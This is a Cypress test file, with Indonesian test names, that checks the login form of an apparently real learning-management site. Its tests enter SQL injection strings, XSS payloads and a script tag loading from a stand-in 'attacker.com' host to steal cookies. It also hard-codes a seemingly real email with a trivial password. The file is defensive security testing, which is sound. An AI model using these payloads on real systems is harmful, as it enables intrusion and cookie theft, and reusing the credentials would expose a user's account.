describe('Login Tests', () => {
  beforeEach(() => {
    cy.visit('https://lms.teknologidigital.co.id/login');
  });

  it('TC-DS-GURU-01: Guru berhasil login dengan email dan kata sandi yang benar', () => {
    cy.get('input[name="email"]').type('myeni7199@gmail.com');
    cy.get('input[name="password"]').type('password');
    cy.get('button[type="submit"]').click();
    cy.contains('Dashboard').should('be.visible');
    cy.contains(/myeni7199@gmail\.com/i).should('be.visible');
  });

   it('TC-DS-CTG-02: Email benar, kata sandi salah', () => {
    cy.get('input[name="email"]').should('be.visible').type('myeni7199@gmail.com');
    cy.get('input[name="password"]').should('be.visible').type('sandi123');
    cy.get('button[type="submit"]').click();
    cy.contains(/Email atau Kata Sandi Tidak Sesuai/i).should('be.visible');
  });

  it('TC-DS-CTG-03: Email salah, kata sandi benar', () => {
    cy.get('input[name="email"]').type('adminn@gmail.com');
    cy.get('input[name="password"]').type('password');
    cy.get('button[type="submit"]').click();
    cy.contains('Email atau Kata Sandi Tidak Sesuai.').should('be.visible');
  });

  it('TC-DS-CTG-04: Email dan kata sandi kosong', () => {
    cy.get('button[type="submit"]').click();
    cy.get('input[name="email"]:invalid').should('exist');
    cy.get('input[name="password"]:invalid').should('exist');
  });

  it('TC-DS-CTG-05: SQL Injection pada kolom email', () => {
    cy.get('input[name="email"]').type(" 'OR '1'='1' ");
    cy.get('input[name="password"]').type('sandi12345');
    cy.get('button[type="submit"]').click();
    cy.get('input[name="email"]').type("test'OR'1'='1@gmail.com");
  });

  it('TC-DS-CTG-06: SQL Injection pada kolom password', () => {
    cy.get('input[name="email"]').type('myeni7199@gmail.com');
    cy.get('input[name="password"]').type("' OR '1'='1");
    cy.get('button[type="submit"]').click();
    cy.contains('Email atau Kata Sandi Tidak Sesuai').should('be.visible');
  });

  it('TC-DS-CTG-07: XSS di kolom email', () => {
    cy.get('input[name="email"]').type('<script>alert("hai")</script>');
    cy.get('input[name="password"]').type('sandi12345');
    cy.get('button[type="submit"]').click();
    cy.get('input[name="email"]').type("test'<script>alert('hai')</script>'@gmail.com");;
  });

  it('TC-DS-CTG-08: XSS di kolom password', () => {
    cy.get('input[name="email"]').type('myeni7199@gmail.com');
    cy.get('input[name="password"]').type('<script>alert("hai")</script>');
    cy.get('button[type="submit"]').click();
    cy.contains('Email atau Kata Sandi Tidak Sesuai').should('be.visible');
  });

  it('TC-DS-CTG-09: Uji XSS panjang di kolom email', () => {
    cy.get('input[name="email"]').type('<script src="https://attacker.com/set?cookie=steal"></script>');
    cy.get('input[name="password"]').type('sandi12345');
    cy.get('button[type="submit"]').click();
    cy.get('body').then(($body) => {
    cy.log($body.text('Email atau Kata Sandi Tidak Sesuai.'));
});

  });

  it('TC-DS-CTG-10: Uji XSS panjang di kolom password', () => {
    cy.get('input[name="email"]').type('myeni7199@gmail.com');
    cy.get('input[name="password"]').type('<img src=x onerror=alert(1)>');
    cy.get('button[type="submit"]').click();
    cy.contains('Email atau Kata Sandi Tidak Sesuai.').should('be.visible');
  });
});